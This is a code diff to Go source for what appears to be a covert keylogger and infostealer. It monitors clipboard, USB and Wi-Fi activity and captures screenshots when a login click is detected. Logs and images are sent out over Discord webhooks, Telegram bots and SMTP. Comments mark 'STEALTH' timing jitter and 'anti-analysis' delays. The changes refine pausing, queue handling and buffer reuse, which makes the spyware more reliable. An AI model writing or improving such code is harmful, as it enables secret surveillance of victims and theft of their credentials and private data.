@@ -183,19 +183,34 @@ func (l *Logger) Start() {
 
 	// Start Clipboard Monitor.
 	clipMon := newClipboardMonitor(func(logLine string) {
-		l.report(logLine)
+		l.Mu.Lock()
+		paused := l.Paused
+		l.Mu.Unlock()
+		if !paused {
+			l.report(logLine)
+		}
 	})
 	go clipMon.start()
 
 	// Start USB Drive Monitor.
 	usbMon := newUSBMonitor(func(logLine string) {
-		l.report(logLine)
+		l.Mu.Lock()
+		paused := l.Paused
+		l.Mu.Unlock()
+		if !paused {
+			l.report(logLine)
+		}
 	})
 	go usbMon.start()
 
 	// Start Wi-Fi Network Monitor.
 	wifiMon := newWifiMonitor(func(logLine string) {
-		l.report(logLine)
+		l.Mu.Lock()
+		paused := l.Paused
+		l.Mu.Unlock()
+		if !paused {
+			l.report(logLine)
+		}
 	})
 	go wifiMon.start()
 
@@ -261,11 +276,22 @@ func (l *Logger) Start() {
 				}
 				// TRIGGER 3: Click detection (0x0201 = Left Click Down)
 				if mouseEv.Message == 0x0201 {
-					win := l.getActiveWindowInfo()
-					// Check for "Login" button feel
-					l.checkScreenshotTrigger(win, true)
+					l.Mu.Lock()
+					paused := l.Paused
+					l.Mu.Unlock()
+					if !paused {
+						win := l.getActiveWindowInfo()
+						// Check for "Login" button feel
+						l.checkScreenshotTrigger(win, true)
+					}
 				}
 			case <-focusTicker.C:
+				l.Mu.Lock()
+				paused := l.Paused
+				l.Mu.Unlock()
+				if paused {
+					continue
+				}
 				// TRIGGER 2: Screenshot on Focus Change (immediate)
 				win := l.getActiveWindowInfo()
 				l.Mu.Lock()
@@ -493,14 +519,42 @@ func (l *Logger) worker() {
 			}
 		}
 
-		// 2. Sync to Discord if configured.
-		l.syncDiscord()
+		// Queue drain mechanism: Drain all pending items in LogQueue to local storage
+		// BEFORE running network syncs. This prevents the 2-8 second anti-analysis
+		// sleep from delaying the writing of subsequent rapid events.
+	drainLoop:
+		for {
+			select {
+			case nextContent := <-l.LogQueue:
+				l.writeCount++
+				if l.writeCount%50 == 0 {
+					config.RotateLogIfNeeded()
+				}
+				nextEncrypted, err := l.encrypt([]byte(nextContent))
+				if err == nil {
+					encoded := base64.StdEncoding.EncodeToString(nextEncrypted)
+					file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
+					if err == nil {
+						file.WriteString(encoded)
+						file.WriteString("\n")
+						file.Close()
+					}
+				}
+			default:
+				break drainLoop
+			}
+		}
 
-		// STEALTH: Random jitter between sync calls (2-8 seconds).
-		time.Sleep(time.Duration(2+randv2.IntN(6)) * time.Second)
+		// 2. Sync to Discord if configured.
+		sentDiscord := l.syncDiscord()
 
 		// 3. Sync to Telegram if configured.
-		l.syncTelegram()
+		sentTelegram := l.syncTelegram()
+
+		// STEALTH: Random jitter between sync calls ONLY if data was sent
+		if sentDiscord || sentTelegram {
+			time.Sleep(time.Duration(2+randv2.IntN(6)) * time.Second)
+		}
 
 		// 4. Sync via SMTP if configured.
 		if smtp.isEnabled() {
@@ -516,15 +570,15 @@ func (l *Logger) worker() {
 
 // syncDiscord attempts to send all pending logs from the local file to Discord.
 // Logs are decrypted from the local storage file and sent as cleartext embeds.
-func (l *Logger) syncDiscord() {
+func (l *Logger) syncDiscord() bool {
 	if l.Config.WebhookURL == "" {
-		return
+		return false
 	}
 
 	path := config.GetStoragePath()
 	file, err := os.Open(path)
 	if err != nil {
-		return
+		return false
 	}
 	defer file.Close()
 
@@ -554,7 +608,7 @@ func (l *Logger) syncDiscord() {
 	}
 
 	if len(pendingLines) == 0 {
-		return
+		return false
 	}
 
 	// Format nicely for Discord
@@ -595,19 +649,21 @@ func (l *Logger) syncDiscord() {
 		state.LastSentIndex = lineCount
 		config.SaveSyncState(state)
 	}
+	
+	return true
 }
 
 // syncTelegram attempts to send all pending logs to Telegram as cleartext.
 // Private Telegram bot channels are not scanned, so cleartext is safe.
-func (l *Logger) syncTelegram() {
+func (l *Logger) syncTelegram() bool {
 	if l.Config.TelegramToken == "" || l.Config.TelegramChatID == "" {
-		return
+		return false
 	}
 
 	path := config.GetStoragePath()
 	file, err := os.Open(path)
 	if err != nil {
-		return
+		return false
 	}
 	defer file.Close()
 
@@ -636,7 +692,7 @@ func (l *Logger) syncTelegram() {
 	}
 
 	if len(pendingLines) == 0 {
-		return
+		return false
 	}
 
 	// Format nicely for Telegram with Markdown.
@@ -680,6 +736,8 @@ func (l *Logger) syncTelegram() {
 		state.LastSentTGIndex = lineCount
 		config.SaveSyncState(state)
 	}
+	
+	return true
 }
 
 // splitMessage splits a string into chunks of maxLen size, splitting at newlines where possible.
@@ -858,7 +916,10 @@ func (l *Logger) takeAndSendScreenshot(win string) {
 		}
 		
 		imageData := buf.Bytes()
-		screenshotBufPool.Put(buf) // safe to return buffer since we copied bytes
+		// DO NOT return buf to screenshotBufPool here!
+		// buf.Bytes() returns a slice of the underlying array, NOT a copy!
+		// Returning it now would allow the next screenshot in the batch 
+		// to overwrite imageData before the network requests finish.
 		
 		client := sharedHTTPClient
 		ts := time.Now().Format("15:04:05")
@@ -902,5 +963,8 @@ func (l *Logger) takeAndSendScreenshot(win string) {
 			req.Header.Set("Content-Type", writer.FormDataContentType())
 			client.Do(req)
 		}
+		
+		// NOW it is safe to return the buffer to the pool
+		screenshotBufPool.Put(buf)
 	}
 }
